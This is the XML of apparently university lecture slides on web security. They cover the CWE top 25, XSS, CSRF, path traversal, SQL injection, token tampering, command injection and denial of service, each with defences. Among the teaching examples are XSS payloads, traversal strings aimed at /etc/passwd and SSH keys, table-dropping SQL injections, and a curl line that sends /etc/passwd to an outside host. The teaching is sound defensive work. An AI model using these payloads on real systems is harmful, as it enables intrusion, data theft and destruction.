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notes">
      <style:graphic-properties draw:fill-color="#ffffff" fo:min-height="12.572cm"/>
    </style:style>
    <style:style style:name="pr7" style:family="presentation" style:parent-style-name="Abram_27_s_25_20Personal_25_20Noise_25_20Template-outline1">
      <style:graphic-properties fo:min-height="11.93cm"/>
    </style:style>
    <style:style style:name="P1" style:family="paragraph">
      <style:text-properties fo:font-family="'Ubuntu Light'" style:font-style-name="Light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Ubuntu" style:font-pitch="variable"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph">
      <style:text-properties fo:font-family="'Ubuntu Light'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Ubuntu Light'" style:font-style-name="Light" style:font-pitch="variable" fo:font-size="32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Web Security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Security On the Web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ultiple facets</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p><text:span text:style-name="T3">Client Side</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p><text:span text:style-name="T3">Server Side</text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T3">High value targets</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p><text:span text:style-name="T3">Private information</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p><text:span text:style-name="T3">Financial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/>Taken from <text:s/><text:a xlink:href="http://cwe.mitre.org/top25/" xlink:type="simple">http://cwe.mitre.org/top25/</text:a> Bob Martin et al., <text:s/>2011</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>[1]<text:tab/>93.8<text:tab/>CWE-89 <text:tab/>Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[2]<text:tab/>83.3<text:tab/>CWE-78 <text:tab/>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[3]<text:tab/>79.0<text:tab/>CWE-120 <text:tab/>Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[4]<text:tab/>77.7<text:tab/>CWE-79 <text:tab/>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[5]<text:tab/>76.9<text:tab/>CWE-306 <text:tab/>Missing Authentication for Critical Function</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[6]<text:tab/>76.8<text:tab/>CWE-862 <text:tab/>Missing Authorization</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[7]<text:tab/>75.0<text:tab/>CWE-798 <text:tab/>Use of Hard-coded Credentials</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[8]<text:tab/>75.0<text:tab/>CWE-311 <text:tab/>Missing Encryption of Sensitive Data</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[9]<text:tab/>74.0<text:tab/>CWE-434 <text:tab/>Unrestricted Upload of File with Dangerous Type</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[10]<text:tab/>73.8<text:tab/>CWE-807 <text:tab/>Reliance on Untrusted Inputs in a Security Decision</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[11]<text:tab/>73.1<text:tab/>CWE-250 <text:tab/>Execution with Unnecessary Privileges</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[12]<text:tab/>70.1<text:tab/>CWE-352 <text:tab/>Cross-Site Request Forgery (CSR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[13]<text:tab/>69.3<text:tab/>CWE-22 <text:tab/>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[14]<text:tab/>68.5<text:tab/>CWE-494 <text:tab/>Download of Code Without Integrity Check</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[15]<text:tab/>67.8<text:tab/>CWE-863 <text:tab/>Incorrect Authorization</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[16]<text:tab/>66.0<text:tab/>CWE-829 <text:tab/>Inclusion of Functionality from Untrusted Control Sphere</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[17]<text:tab/>65.5<text:tab/>CWE-732 <text:tab/>Incorrect Permission Assignment for Critical Resource</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[18]<text:tab/>64.6<text:tab/>CWE-676 <text:tab/>Use of Potentially Dangerous Function</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[19]<text:tab/>64.1<text:tab/>CWE-327 <text:tab/>Use of a Broken or Risky Cryptographic Algorithm</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[20]<text:tab/>62.4<text:tab/>CWE-131 <text:tab/>Incorrect Calculation of Buffer Size</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[21]<text:tab/>61.5<text:tab/>CWE-307 <text:tab/>Improper Restriction of Excessive Authentication Attempts</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[22]<text:tab/>61.1<text:tab/>CWE-601 <text:tab/>URL Redirection to Untrusted Site ('Open Redirect')</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[23]<text:tab/>61.0<text:tab/>CWE-134 <text:tab/>Uncontrolled Format String</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[24]<text:tab/>60.3<text:tab/>CWE-190 <text:tab/>Integer Overflow or Wraparound</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>[25]<text:tab/>59.9<text:tab/>CWE-759 <text:tab/>Use of a One-Way Hash without a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Consider What is your website supposed to d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your website supposed to:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Be a distributor of malware?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Vouch for the identity of frausters?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Run arbitrary code?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Distribute pirated software/media?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Host pornography</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p><text:span text:style-name="T4">Do anything you didn't want it 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you ask a user for a username</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>They provide</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>&lt;iframe width=”100%” height=”100% src=”<text:a xlink:href="http://cnn.com/" xlink:type="simple">http://cnn.com/</text:a>”&gt;&lt;/iframe&gt;</text:p>
                      </text:list-item>
                      <text:list-item>
                        <text:p>Now your website looks like CNN.com</text:p>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Was that your intent?</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>No you just wanted to show a username.</text:p>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                  <text:list-item>
                    <text:p>How does this happen?</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>You don't properly encode the output such that it escapes as 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draw:frame presentation:style-name="pr4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 security/server.py</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Safe <text:a xlink:href="http://127.0.0.1:5000/happybirthday" xlink:type="simple">http://127.0.0.1:5000/happybirthday</text:a></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Unsafe <text:a xlink:href="http://127.0.0.1:5000/happybirthday2" xlink:type="simple">http://127.0.0.1:5000/happybirthday2</text:a></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Try to inject 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on XSS</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Often values are printed as URIs or attributes</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>e.g. &lt;a href=”<text:a xlink:href="http://example.com/user/%25s" xlink:type="simple">http://example.com/user/%s</text:a>”&gt;</text:p>
                      </text:list-item>
                      <text:list-item>
                        <text:p>The simplest XSS exploit is to pass a “ and wreck that tag:</text:p>
                        <text:list>
                          <text:list-item>
                            <text:p>name=”&gt;&lt;script&gt;alert(“xss”);&lt;/script&gt;&lt;</text:p>
                          </text:list-item>
                        </text:list>
                      </text:list-item>
                      <text:list-item>
                        <text:p>E.g. provide the Color for your username</text:p>
                        <text:list>
                          <text:list-item>
                            <text:p>color=FFFFFF</text:p>
                          </text:list-item>
                          <text:list-item>
                            <text:p>color=FFFFFF”&lt;/style&gt;&lt;style/&gt;&lt;script&gt;alert(“xss”);&lt;/script&gt;&l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?</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Never print out anything from the user (easier said than done)</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Validate all values you embed in HTML</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Appropriately encode all values</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>URI Encode URIs, don't just concatenate</text:p>
                      </text:list-item>
                      <text:list-item>
                        <text:p>HTML Escape HTML entities</text:p>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Use a templater that will automatically escape everything for you</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Don't use innerHTML in Javascript. Use .html and .text in Jquery or new Text( text ) in Javascript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13cm" svg:x="1.4cm" svg:y="0.734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is could be a big deal?</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>It leads to CWE-352 <text:tab/>Cross-Site Request Forgery (CSRF)</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>If the website trusts the user and the attacker can inject content, they can inject javascript or other tags and execute commands on the websit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ck a user or user agent in executing unintended requests.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Hijack weak authentication measures:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Cookies and sessions</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Repeat actions unnecessar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</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Enforce referrer headers (still not perfect)</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Request tokens – don't allow repeated requests</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Make GET/HEAD/OPTIONS safe</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>/logout should not be a GET</text:p>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Avoid any chance of XSS</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Don't rely on cookies, rely on full HTTP auth</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Don't allow users to provide URLs that get embedded!</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Rely on matching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with other tokens</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Origin header</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>Make sure it comes from a trusted source</text:p>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Challenge Response</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>Make the client provide extra information:</text:p>
                        <text:list>
                          <text:list-item>
                            <text:p>Re-login</text:p>
                          </text:list-item>
                          <text:list-item>
                            <text:p>Password</text:p>
                          </text:list-item>
                          <text:list-item>
                            <text:p>Captcha</text:p>
                          </text:list-item>
                          <text:list-item>
                            <text:p>A token you texted th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Access files and URIs that weren't supposed to be exposed!</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>../../.ssh/id_dsa – your SSH key!</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>../../../../../../../etc/passwd ← used to be more useful</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>../../.htpasswd ← passwords for apache webserver</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Often the solution many people do is inadequate:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>s/.././g <text:s text:c="2"/>→ so then I just go …/.../ instead</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Basically if you detect path traversal, maybe you should just deny them access?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Use path name parsers to ensure that you have a safe pa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<text:s/>E.g. <text:a xlink:href="http://127.0.0.1:5000/traverse?entity=../../../../../../../etc/passwd" xlink:type="simple">http://127.0.0.1:5000/traverse?entity=../../../../../../../etc/passwd</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Versus http://127.0.0.1:5000/traverse_sane?entity=../../../../../../../etc/passw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item>
                    <text:p>CWE-829 <text:tab/>Inclusion of Functionality from Untrusted Control Sphe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services want you to include iframes and embeddings from them.</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>They make you trust them not to ruin your site.</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Lots of advertisement networks expect the same from you.</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>When included untrusted content there can be consequences, whether by iframe or actual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list text:style-name="L1">
              <text:list-item>
                <text:list>
                  <text:list-header>
                    <text:p>CWE-829 <text:tab/>Inclusion of Functionality from Untrusted Control Sphere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e <text:a xlink:href="http://127.0.0.1:5000/static/ads.html" xlink:type="simple">http://127.0.0.1:5000/static/ads.html</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>See <text:s/>malicious_ad in server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Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'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= “select * from user_table where id = %s” % userid</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>What's the problem he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Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'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= “select * from user_table where id = %s” % userid</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>What's the problem here?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>What will this userid do?</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>0;drop table user_table</text:p>
                      </text:list-item>
                      <text:list-item>
                        <text:p>0 or 1=1</text:p>
                      </text:list-item>
                      <text:list-item>
                        <text:p>10; update user_table set admin=1; select * from user_table where id = 10</text:p>
                        <text:list>
                          <text:list-item>
                            <text:p>Add everyone as admin and hide yoursel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 Patter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Breaking quotes</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Returning all values with 1 or 1=1</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Making multiple statements</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Selecting ALL passwords from the database</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Vandalism: dropping t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 Solution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lution?</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>SQL Quote all values.</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>Use the SQL execute statement</text:p>
                      </text:list-item>
                      <text:list-item>
                        <text:p>NEVER craft a SQL query purely from input strings</text:p>
                      </text:list-item>
                      <text:list-item>
                        <text:p>ESCAPE ESCAPE ESCAPE</text:p>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Don't:</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>sql.execute(“select * from tab where v=\”%s\”” % v)</text:p>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Do</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>sql.execute(“select * from tab where v = ?”, v)</text:p>
                      </text:list-item>
                      <text:list-item>
                        <text:p>PHP</text:p>
                        <text:list>
                          <text:list-item>
                            <text:p>$dbh-&gt;prepare(“select * from tab where v = <text:s/>:v”);</text:p>
                          </text:list-item>
                          <text:list-item>
                            <text:p>$dbh-&gt;bindParam(“:v”, $v);</text:p>
                          </text:list-item>
                          <text:list-item>
                            <text:p>$dbh-&gt;execute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hy does it work?</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Many sites use SQL</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Many sites use products that are available for inspection (punbb, wordpress, etc.)</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Some languages and frameworks didn't pay attention at the start</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>PHP!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web is stateless! Why not rely on the user to hold the state?</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>What is they change it or lie?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Well lets just encrypt it and they won't be able to read their tokens.</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>So let's set application state in the user's cookie so we don't need to use a database to store their sess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Dangers of Tokens:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>What if I steal them?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>What if I reuse them?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>What if I repeat them?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Does a hacker ever need to login now?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Furthermore, hackers can change tokens even if they can't read them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/Toke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ait hackers can change encrypted data?</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Naive implementations do not check the integrity of an encrypted message</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>If you don't protect integrity then you will decrypt garbage</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>But what is garbage is all you need to break in?</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>I can change a message w/o reading it.</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>INITIATE DEM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orly Encrypted Cookies/Toke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irst and Foremost, </text:p>
                <text:list>
                  <text:list-item>
                    <text:p>encryption done well is hard</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Rely on integrity checks</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Sign values</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Do not accept encrypted values that do not decrypt totally</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Most encryption hacks are in failures in the implementation, not in the actual algorithm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orly Encrypted Cookies/Toke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kens are not that safe</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Make sure you can test their integrity</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Make sure it is hard to reuse a token</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>Hash in the user's IP so they have to be at least from the same host</text:p>
                        <text:list>
                          <text:list-item>
                            <text:p>Doesn't help for a university level hack :(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ame as the other injections but instead of SQL you run a command. </text:p>
                <text:list>
                  <text:list-item>
                    <text:p>A malicious user can insert escape codes to run what they want.</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Imagine:</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>os.system(“command arg1 arg2 %s”, arg3)</text:p>
                      </text:list-item>
                      <text:list-item>
                        <text:p>Imagine I supply </text:p>
                        <text:list>
                          <text:list-item>
                            <text:p>“; curl -X PUT http://mysite -d @/etc/passwd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:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Use libraries that escape all shell commands</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Don't execute commands with a shell, just do direct exec.</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>e.g. subprorcess.call([“command”,arg1,arg2,arg3]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nial of Service</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Make a service unavailable</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Common methods</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Spamming</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Flooding</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Filling queues with information</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Sending useless expensive jobs</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Using all available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ributed Denial of Service</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Like a DOS but commonly run from multiple machines</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Common methods</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Redirecting webtraffic</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Using DNS poisoning to redirect people</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Lying to routers to route traffic to a non router</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Sending very slowly</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Reading very slow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ff Atwood, Cross-Site Request Forgeries and You, <text:s/><text:a xlink:href="http://blog.codinghorror.com/cross-site-request-forgeries-and-you/" xlink:type="simple">http://blog.codinghorror.com/cross-site-request-forgeries-and-you/</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>OWASP, Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet, <text:a xlink:href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet" xlink:type="simple">https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>OWASP, XSS (Cross Site Scripting) Prevention Cheat Sheet <text:s/>, <text:a xlink:href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" xlink:type="simple">https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet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b Application Security</text:p>
                <text:list>
                  <text:list-item>
                    <text:p><text:a xlink:href="http://proquest.safaribooksonline.com/book/-/9780071776165?bookview=overview" xlink:type="simple">http://proquest.safaribooksonline.com/book/-/9780071776165?bookview=overview</text:a></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Web Security Testing Cookbook</text:p>
                <text:list>
                  <text:list-item>
                    <text:p><text:a xlink:href="http://proquest.safaribooksonline.com/book/-/9780071776165?bookview=overview" xlink:type="simple">http://proquest.safaribooksonline.com/book/-/9780071776165?bookview=overview</text:a></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>How to deal with passwords <text:a xlink:href="https://github.com/MHM5000/pass" xlink:type="simple">https://github.com/MHM5000/pass</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Security Engineering <text:a xlink:href="http://www.cl.cam.ac.uk/%7Erja14/book.html" xlink:type="simple">http://www.cl.cam.ac.uk/%7Erja14/book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 to Hack a website <text:a xlink:href="https://www.youtube.com/watch?v=O90lSMmTjjo" xlink:type="simple">https://www.youtube.com/watch?v=O90lSMmTjjo</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>PHP Security Guide http://phpsec.org/projects/guide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5T00:01:11.494386528</meta:creation-date>
    <meta:editing-duration>PT1H13M20S</meta:editing-duration>
    <meta:editing-cycles>12</meta:editing-cycles>
    <meta:generator>LibreOffice/3.5$Linux_X86_64 LibreOffice_project/350m1$Build-2</meta:generator>
    <dc:title>Abram's Personal Noise Template</dc:title>
    <meta:initial-creator>Abram Hindle</meta:initial-creator>
    <dc:date>2014-03-19T12:06:21</dc:date>
    <dc:creator>Abram Hindle</dc:creator>
    <meta:document-statistic meta:object-count="157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